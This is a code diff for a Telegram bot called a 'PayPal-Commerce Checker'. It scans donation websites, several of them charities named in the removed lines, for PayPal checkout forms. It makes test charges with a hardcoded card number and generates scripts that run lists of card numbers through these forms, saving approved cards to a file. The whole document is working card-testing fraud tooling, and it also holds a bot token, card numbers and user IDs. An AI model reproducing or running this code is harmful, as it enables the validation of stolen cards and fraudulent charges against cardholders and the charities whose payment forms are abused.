+            if not order_id:
+                return "Create Order Failed"
         except Exception as e:
-            elapsed = time.time() - start
-            print(f'  ❌ EXCEPTION: {str(e)[:200]}')
-            summary.append((name, 'ERROR', str(e)[:60], elapsed))
-        await asyncio.sleep(2)
-    
-    print(f'\n{"=" * 70}\n📊 SUMMARY\n{"=" * 70}')
-    for n, s, c, t in summary:
-        icon = '✅' if s == 'LIVE' else '❌'
-        print(f'{icon} {n:<22} | {s:<6} | {c:<25} | {t:.1f}s')
+            return f"Create Order Error: {{e}}"
+
+        token = self.client_token or self.client_id
+        try:
+            confirm = self.session.post(
+                f"https://cors.api.paypal.com/v2/checkout/orders/{{order_id}}/confirm-payment-source",
+                headers={{"Authorization": f"Bearer {{token}}", "Content-Type": "application/json", "PayPal-Client-Metadata-Id": self.client_id}},
+                json={{"payment_source": {{"card": {{"number": n, "expiry": expiry, "security_code": cvc, "attributes": {{"verification": {{"method": "SCA_WHEN_REQUIRED"}}}}}}}}, "application_context": {{"vault": False}}}},
+                timeout=25,
+            )
+            classified = self.classify(confirm.text)
+            if classified == "CHARGE":
+                cap = self.session.post(
+                    f"https://api-m.paypal.com/v2/checkout/orders/{{order_id}}/capture",
+                    headers={{"Authorization": f"Bearer {{token}}", "Content-Type": "application/json"}},
+                    timeout=25,
+                )
+                return self.classify(cap.text)
+            return classified
+        except Exception as e:
+            return f"Confirm Error: {{e}}"
+
+    def close(self):
+        try:
+            self.session.close()
+        except Exception:
+            pass
 
 
-# ═══════════════════════════════════════════════════════════════════════
+if __name__ == "__main__":
+    print("PayPal-Commerce Checker — Site:", "{safe(link)}")
+    mode = input("Mode (1=Manual, 2=Combo): ").strip()
+    if mode == "1":
+        while True:
+            card = input("Card (n|mm|yy|cvc): ").strip()
+            if not card:
+                break
+            c = Checker()
+            res = c.charge(card)
+            print(f"Result: {{res}}")
+            if res == "CHARGE" or "INSUFFICIENT" in res:
+                with open("Approved.txt", "a") as f:
+                    f.write(f"{{card}} | {{res}}\\n")
+            c.close()
+            time.sleep(3)
+    else:
+        fn = input("Combo file: ").strip()
+        with open(fn, "r") as f:
+            cards = [l.strip() for l in f if l.strip()]
+        for i, card in enumerate(cards, 1):
+            c = Checker()
+            try:
+                res = c.charge(card)
+            except Exception as e:
+                res = f"Error: {{e}}"
+            print(f"[{{i}}] {{card}} >> {{res}}")
+            if res == "CHARGE" or "INSUFFICIENT" in res:
+                with open("Approved.txt", "a") as f:
+                    f.write(f"{{card}} | {{res}}\\n")
+            c.close()
+            time.sleep(10)
+'''
+    return code
+
+
+# ═══════════════════════════════════════════════════════════════════
+# BOT — Part 1 (will be continued in next message)
+# ═══════════════════════════════════════════════════════════════════
+
+TOKEN = '8689698569:AAF6GOOcFdsTnG_UXXHLqWkis0bCsIFsQJQ'
+OWNER_ID = 6843321125
+ADMINS = ['6843321125']
+
+bot = telebot.TeleBot(TOKEN, parse_mode='HTML')
+
+waiting_users = {}
+reply_mode = {}
+processing_status = {}
+blocked_users = set()
+
+
+def load_blocked():
+    global blocked_users
+    if not os.path.exists('blockusers.txt'):
+        open('blockusers.txt', 'w').close()
+        return
+    with open('blockusers.txt', 'r') as f:
+        blocked_users = set(x.strip() for x in f.read().splitlines() if x.strip())
+
+
+def save_blocked():
+    with open('blockusers.txt', 'w') as f:
+        f.write('\n'.join(sorted(blocked_users)))
+
+
+def is_blocked(uid):
+    return str(uid) in blocked_users
+
+
+load_blocked()
+
+# ═══════════════════════════════════════════════════════════════════
+# SAFE TELEGRAM HELPERS
+# ═══════════════════════════════════════════════════════════════════
+
+def safe_send(chat_id, text, retries=5, reply_markup=None):
+    for i in range(retries):
+        try:
+            return bot.send_message(chat_id, text, parse_mode='HTML', reply_markup=reply_markup, disable_web_page_preview=True)
+        except Exception as e:
+            err = str(e)
+            if '429' in err:
+                wait = 30
+                try:
+                    wait = int(err.split('retry after ')[1].split(')')[0])
+                except Exception:
+                    pass
+                time.sleep(min(wait + 5, 65))
+            elif '502' in err or '500' in err or 'Timed out' in err or 'Connection' in err:
+                time.sleep(3 * (i + 1))
+            else:
+                print(f'[send] {err[:120]}')
+                break
+    return None
+
+
+def safe_edit(chat_id, msg_id, text, retries=5):
+    for i in range(retries):
+        try:
+            return bot.edit_message_text(text, chat_id, msg_id, parse_mode='HTML', disable_web_page_preview=True)
+        except Exception as e:
+            err = str(e)
+            if '429' in err:
+                wait = 30
+                try:
+                    wait = int(err.split('retry after ')[1].split(')')[0])
+                except Exception:
+                    pass
+                time.sleep(min(wait + 5, 65))
+            elif '502' in err or '500' in err or 'Timed out' in err or 'Connection' in err:
+                time.sleep(3 * (i + 1))
+            else:
+                break
+    return None
+
+
+def safe_send_doc(chat_id, path, caption='', retries=5):
+    for i in range(retries):
+        try:
+            with open(path, 'rb') as f:
+                return bot.send_document(chat_id, f, caption=caption, parse_mode='HTML')
+        except Exception as e:
+            err = str(e)
+            if '429' in err:
+                wait = 30
+                try:
+                    wait = int(err.split('retry after ')[1].split(')')[0])
+                except Exception:
+                    pass
+                time.sleep(min(wait + 5, 65))
+            elif '502' in err or '500' in err or 'Timed out' in err or 'Connection' in err:
+                time.sleep(3 * (i + 1))
+            else:
+                break
+    return None
+
+
+def safe_get_file(file_id, retries=5):
+    for i in range(retries):
+        try:
+            return bot.get_file(file_id)
+        except Exception:
+            time.sleep(3 * (i + 1))
+    return None
+
+
+def safe_download(file_path, retries=5):
+    for i in range(retries):
+        try:
+            return bot.download_file(file_path)
+        except Exception:
+            time.sleep(3 * (i + 1))
+    return None
+
+
+# ═══════════════════════════════════════════════════════════════════
+# LIVE GATEWAY MESSAGE
+# ═══════════════════════════════════════════════════════════════════
+
+def build_live_message(idx, link, response, amount, currency, auth_type, gw_type, client_token):
+    return (
+        f"✅ <b>Live Gateway v{idx}!</b>\n"
+        f"━━━━━━━━━━━━━━━━━━━━\n"
+        f"🔗 <code>{link}</code>\n"
+        f"━━━━━━━━━━━━━━━━━━━━\n"
+        f"💬 <b>Response:</b> <code>{response}</code>\n"
+        f"💰 <b>Amount:</b> {amount}\n"
+        f"💱 <b>Currency:</b> {currency}\n"
+        f"🔐 <b>Auth:</b> {auth_type}\n"
+        f"🌐 <b>GW:</b> {gw_type}\n"
+        f"📋 <b>token:</b> <code>{(client_token or 'N/A')[:80]}</code>\n"
+        f"━━━━━━━━━━━━━━━━━━━━\n"
+        f"Dev: @FAWZY30"
+    )
+
+
+# ═══════════════════════════════════════════════════════════════════
+# /start
+# ═══════════════════════════════════════════════════════════════════
+
+@bot.message_handler(commands=['start'])
+def cmd_start(message):
+    if is_blocked(message.from_user.id):
+        safe_send(message.chat.id, 'You are blocked.')
+        return
+
+    uid = message.from_user.id
+    name = message.from_user.first_name
+    uname = message.from_user.username or 'No Username'
+
+    text = (
+        f"[⚡] <b>Welcome To PayPal-Commerce Checker Bot</b> 🌟\n"
+        f"[⚡] Name: {name}\n"
+        f"[⚡] Username: @{uname}\n"
+        f"[⚡] ID: <code>{uid}</code>\n"
+        f"- - - - - - - - - - - - - - - - - - - - - -\n"
+        f"[⚡] PayPal Gateway >> /paypal\n"
+        f"[⚡] Mass Extract >> /mass\n"
+        f"[⚡] Stop Process >> /stop\n"
+        f"[⚡] Send Feedback >> Button Below\n"
+        f"- - - - - - - - - - - - - - - - - - - - - -\n"
+        f"[⚡] Bot By: @FAWZY30\n"
+        f"[⚡] Dev By: Wafa."
+    )
+
+    kb = types.InlineKeyboardMarkup()
+    kb.add(types.InlineKeyboardButton('📩 Submit Feedback to Owner', callback_data='feedback'))
+    safe_send(message.chat.id, text, reply_markup=kb)
+
+
+# ═══════════════════════════════════════════════════════════════════
+# /paypal
+# ═══════════════════════════════════════════════════════════════════
+
+TEST_CARD = '5178059345865258|08|27|639'
+
+
+@bot.message_handler(commands=['paypal'])
+def cmd_paypal(message):
+    if is_blocked(message.from_user.id):
+        safe_send(message.chat.id, 'You are blocked.')
+        return
+
+    parts = message.text.split(maxsplit=1)
+    if len(parts) != 2:
+        safe_send(message.chat.id, 'Usage:\n<code>/paypal https://site.com/donate</code>')
+        return
+
+    link = parts[1].strip()
+    if not link.startswith(('http://', 'https://')):
+        safe_send(message.chat.id, 'Invalid link.')
+        return
+
+    status = safe_send(message.chat.id, '🔍 Scanning site...')
+    if not status:
+        return
+
+    paypal = None
+    try:
+        paypal = PayPalCommerce(link)
+        if not paypal.is_valid:
+            safe_edit(message.chat.id, status.message_id, '❌ Site unreachable or not a PayPal-Commerce form.')
+            return
+
+        safe_edit(message.chat.id, status.message_id, '💳 Testing card...')
+
+        result = paypal.charge(TEST_CARD, amount=paypal.minimum_amount or '1.00')
+
+        resp_text = result.get('response', 'Unknown')
+        resp_status = result.get('status', 'UNKNOWN')
+
+        if resp_status == 'LIVE':
+            auth_type = 'client_token' if paypal.client_token else ('access_token' if paypal.access_token else ('client_id' if paypal.client_id else 'none'))
+            gw_type = 'PayPal-Commerce'
+            amount = paypal.minimum_amount or '1.00'
+            currency = paypal.currency or 'USD'
+
+            live_msg = build_live_message(
+                1, link, resp_text, amount, currency,
+                auth_type, gw_type, paypal.client_token or paypal.access_token or ''
+            )
+            safe_send(message.chat.id, live_msg)
+
+            gen_code = generate_gateway_code(resp_text, link, paypal, live_idx=1)
+            fname = f'gateway_{int(time.time())}.py'
+            with open(fname, 'w', encoding='utf-8') as f:
+                f.write(gen_code)
+            safe_send_doc(message.chat.id, fname, caption=f'📄 Gateway Checker — {link}')
+            try:
+                os.remove(fname)
+            except Exception:
+                pass
+        else:
+            safe_edit(
+                message.chat.id, status.message_id,
+                f"❌ <b>Dead:</b> <code>{link}</code>\n"
+                f"📝 <b>Response:</b> <code>{resp_text}</code>"
+            )
+
+    except Exception as e:
+        safe_edit(message.chat.id, status.message_id, f'❌ Error: <code>{str(e)[:150]}</code>')
+    finally:
+        if paypal:
+            paypal.close()
+
+
+# ═══════════════════════════════════════════════════════════════════
+# /mass
+# ═══════════════════════════════════════════════════════════════════
+
+@bot.message_handler(commands=['mass'])
+def cmd_mass(message):
+    if is_blocked(message.from_user.id):
+        safe_send(message.chat.id, 'You are blocked.')
+        return
+    msg = safe_send(message.chat.id, '📁 Send a .txt file with links (one per line):')
+    if msg:
+        bot.register_next_step_handler(msg, handle_mass_file)
+
+
+def handle_mass_file(message):
+    if not message.document:
+        safe_send(message.chat.id, '❌ Please send a .txt file.')
+        return
+
+    try:
+        finfo = safe_get_file(message.document.file_id)
+        if not finfo:
+            safe_send(message.chat.id, '❌ Failed to get file.')
+            return
+
+        raw = safe_download(finfo.file_path)
+        if not raw:
+            safe_send(message.chat.id, '❌ Failed to download.')
+            return
+
+        links = [l.strip() for l in raw.decode('utf-8', errors='ignore').splitlines() if l.strip()]
+        if not links:
+            safe_send(message.chat.id, '❌ File is empty.')
+            return
+
+        total = len(links)
+        uid = message.from_user.id
+        chat_id = message.chat.id
+
+        processing_status[uid] = {
+            'total': total, 'processed': 0, 'live': 0, 'dead': 0,
+            'current': '', 'response': '',
+            'stop': False, 'done': False,
+            'lock': threading.Lock(),
+        }
+
+        status = safe_send(
+            chat_id,
+            f"📊 <b>Mass Extract</b>\n"
+            f"━━━━━━━━━━━━━━━━━━\n"
+            f"📌 Total: {total}\n"
+            f"✅ Live: 0\n"
+            f"❌ Dead: 0\n"
+            f"⏳ 0% ░░░░░░░░░░\n"
+            f"🛑 /stop to stop"
+        )
+        if not status:
+            return
+
+        def updater():
+            last_edit = 0
+            while True:
+                time.sleep(8)
+                st = processing_status.get(uid)
+                if not st or st.get('done'):
+                    break
+                if time.time() - last_edit < 8:
+                    continue
+                try:
+                    with st['lock']:
+                        p = st['processed']
+                        lv = st['live']
+                        dd = st['dead']
+                        cur = st['current']
+                        resp = st['response']
+                    pct = int((p / total) * 100) if total else 0
+                    filled = int(pct / 10)
+                    bar = '█' * filled + '░' * (10 - filled)
+                    txt = (
+                        f"📊 <b>Mass Extract</b>\n"
+                        f"━━━━━━━━━━━━━━━━━━\n"
+                        f"📌 Total: {total}\n"
+                        f"✅ Live: {lv}\n"
+                        f"❌ Dead: {dd}\n"
+                        f"⏳ {pct}% {bar}\n"
+                        f"🌐 <code>{(cur[:55] if cur else '...')}</code>\n"
+                        f"💬 <code>{(resp[:55] if resp else '...')}</code>\n"
+                        f"━━━━━━━━━━━━━━━━━━\n"
+                        f"⏱️ {p}/{total}  |  🛑 /stop"
+                    )
+                    safe_edit(chat_id, status.message_id, txt)
+                    last_edit = time.time()
+                except Exception:
+                    pass
+
+        threading.Thread(target=updater, daemon=True).start()
+
+        for i, link in enumerate(links, 1):
+            st = processing_status.get(uid)
+            if not st or st.get('stop'):
+                break
+
+            with st['lock']:
+                st['current'] = link
+                st['response'] = 'Checking...'
+
+            paypal = None
+            try:
+                paypal = PayPalCommerce(link)
+                if not paypal.is_valid:
+                    result = {'status': 'DEAD', 'response': 'Invalid / unreachable'}
+                else:
+                    result = paypal.charge(TEST_CARD, amount=paypal.minimum_amount or '1.00')
+            except Exception as e:
+                result = {'status': 'DEAD', 'response': f'Error: {str(e)[:80]}'}
+            finally:
+                if paypal:
+                    paypal.close()
+
+            with st['lock']:
+                st['processed'] += 1
+                resp_text = result.get('response', 'Unknown')
+                st['response'] = resp_text
+                if result.get('status') == 'LIVE':
+                    st['live'] += 1
+                    live_idx = st['live']
+
+                    auth_type = 'client_token' if (paypal and paypal.client_token) else ('access_token' if (paypal and paypal.access_token) else 'client_id' if (paypal and paypal.client_id) else 'none')
+                    gw_type = 'PayPal-Commerce'
+                    amount = (paypal.minimum_amount if paypal else '1.00') or '1.00'
+                    currency = (paypal.currency if paypal else 'USD') or 'USD'
+                    ctk = (paypal.client_token or paypal.access_token or '') if paypal else ''
+
+                    live_msg = build_live_message(
+                        live_idx, link, resp_text, amount, currency,
+                        auth_type, gw_type, ctk
+                    )
+                    safe_send(chat_id, live_msg)
+
+                    try:
+                        gen = generate_gateway_code(resp_text, link, paypal, live_idx=live_idx)
+                        fname = f'gateway_{live_idx}_{int(time.time())}.py'
+                        with open(fname, 'w', encoding='utf-8') as f:
+                            f.write(gen)
+                        safe_send_doc(chat_id, fname, caption=f'📄 Checker #{live_idx} — {link}')
+                        try:
+                            os.remove(fname)
+                        except Exception:
+                            pass
+                    except Exception as e:
+                        print(f'gen err: {e}')
+                else:
+                    st['dead'] += 1
+
+            if i % 50 == 0:
+                gc.collect()
+
+        with processing_status[uid]['lock']:
+            processing_status[uid]['done'] = True
+            p = processing_status[uid]['processed']
+            lv = processing_status[uid]['live']
+            dd = processing_status[uid]['dead']
+
+        final = (
+            f"📊 <b>✅ Complete</b>\n"
+            f"━━━━━━━━━━━━━━━━━━\n"
+            f"📌 Total: {total}\n"
+            f"✅ Live: {lv}\n"
+            f"❌ Dead: {dd}\n"
+            f"💯 Rate: {int((lv/total)*100) if total else 0}%\n"
+            f"━━━━━━━━━━━━━━━━━━\n"
+            f"Dev: @FAWZY30"
+        )
+        safe_edit(chat_id, status.message_id, final)
+        processing_status.pop(uid, None)
+
+    except Exception as e:
+        safe_send(message.chat.id, f'❌ Error: <code>{str(e)[:150]}</code>')
+
+
+# ═══════════════════════════════════════════════════════════════════
+# /stop
+# ═══════════════════════════════════════════════════════════════════
+
+@bot.message_handler(commands=['stop'])
+def cmd_stop(message):
+    uid = message.from_user.id
+    st = processing_status.get(uid)
+    if st:
+        with st['lock']:
+            st['stop'] = True
+        safe_send(message.chat.id, '🛑 Stopping...')
+    else:
+        safe_send(message.chat.id, '❌ No active process.')
+
+
+# ═══════════════════════════════════════════════════════════════════
+# FEEDBACK
+# ═══════════════════════════════════════════════════════════════════
+
+@bot.callback_query_handler(func=lambda c: c.data == 'feedback')
+def cb_feedback(call):
+    uid = call.from_user.id
+    kb = types.InlineKeyboardMarkup()
+    kb.add(types.InlineKeyboardButton('🔙 Back', callback_data='back_start'))
+    try:
+        bot.edit_message_text(
+            '📩 Send your message and the admin will respond.',
+            call.message.chat.id, call.message.message_id,
+            reply_markup=kb
+        )
+    except Exception:
+        pass
+    waiting_users[uid] = True
+
+
+@bot.callback_query_handler(func=lambda c: c.data == 'back_start')
+def cb_back(call):
+    cmd_start(call.message)
+
+
+@bot.message_handler(func=lambda m: m.from_user.id in waiting_users)
+def handle_feedback(message):
+    uid = message.from_user.id
+    name = message.from_user.first_name
+
+    kb = types.InlineKeyboardMarkup()
+    kb.add(types.InlineKeyboardButton('Reply', callback_data=f'reply_{uid}'))
+    safe_send(OWNER_ID, f'📩 <b>New Message</b>\nFrom: {name}\nID: <code>{uid}</code>\n\n{message.text}', reply_markup=kb)
+
+    kb2 = types.InlineKeyboardMarkup()
+    kb2.add(types.InlineKeyboardButton('Send another', callback_data='feedback'))
+    safe_send(uid, '✅ Your message has been sent.', reply_markup=kb2)
+
+    waiting_users.pop(uid, None)
+
+
+@bot.callback_query_handler(func=lambda c: c.data.startswith('reply_'))
+def cb_reply(call):
+    target = int(call.data.split('_')[1])
+    reply_mode[call.from_user.id] = target
+    safe_send(call.from_user.id, '✍️ Write your reply now:')
+
+
+@bot.message_handler(func=lambda m: m.from_user.id == OWNER_ID and m.from_user.id in reply_mode)
+def send_reply(message):
+    target = reply_mode[message.from_user.id]
+    safe_send(target, f'📩 <b>Admin:</b>\n\n{message.text}')
+    safe_send(OWNER_ID, '✅ Reply sent.')
+    reply_mode.pop(message.from_user.id, None)
+
+
+# ═══════════════════════════════════════════════════════════════════
+# BLOCK / UNBLOCK
+# ═══════════════════════════════════════════════════════════════════
+
+@bot.message_handler(commands=['block2'])
+def cmd_block(message):
+    if str(message.from_user.id) not in ADMINS:
+        safe_send(message.chat.id, '❌ No permission.')
+        return
+    try:
+        target = message.text.split()[1]
+        blocked_users.add(target)
+        save_blocked()
+        safe_send(message.chat.id, f'✅ Blocked: <code>{target}</code>')
+    except Exception:
+        safe_send(message.chat.id, 'Usage: /block2 [user_id]')
+
+
+@bot.message_handler(commands=['unblock2'])
+def cmd_unblock(message):
+    if str(message.from_user.id) not in ADMINS:
+        safe_send(message.chat.id, '❌ No permission.')
+        return
+    try:
+        target = message.text.split()[1]
+        blocked_users.discard(target)
+        save_blocked()
+        safe_send(message.chat.id, f'✅ Unblocked: <code>{target}</code>')
+    except Exception:
+        safe_send(message.chat.id, 'Usage: /unblock2 [user_id]')
+
+
+# ═══════════════════════════════════════════════════════════════════
 # MAIN
-# ═══════════════════════════════════════════════════════════════════════
+# ═══════════════════════════════════════════════════════════════════
 
 if __name__ == '__main__':
-    CARD = '5104040287872188|12|2027|951'
-    
-    SITES = [
-        ('dandelions',      'https://dandelionsmontessori.org/give/15767517?giveDonationFormInIframe=1'),
-        ('svdpvenicefl',    'https://svdpvenicefl.org/donations/donations/'),
-        ('embracingpurpose','https://embracingpurpose.org/give-now/'),
-        ('violin',          'https://violin.org/giving/'),
-        ('veritascc',       'https://www.veritascc.org/donate'),
-        ('abundantearth',   'https://abundantearthfoundation.org/donations/ancientcacao/'),
-    ]
-    
-    try:
-        asyncio.run(test_sites(CARD, SITES))
-    except KeyboardInterrupt:
-        print('\n⏹️  Interrupted')
-    except Exception as e:
-        print(f'\n❌ Fatal: {e}')
+    print('✅ Bot running...')
+    while True:
+        try:
+            bot.polling(none_stop=True, interval=0, timeout=30, long_polling_timeout=30)
+        except KeyboardInterrupt:
+            print('🛑 Stopped.')
+            break
+        except Exception as e:
+            err = str(e)
+            print(f'❌ {err[:150]}')
+            time.sleep(5)
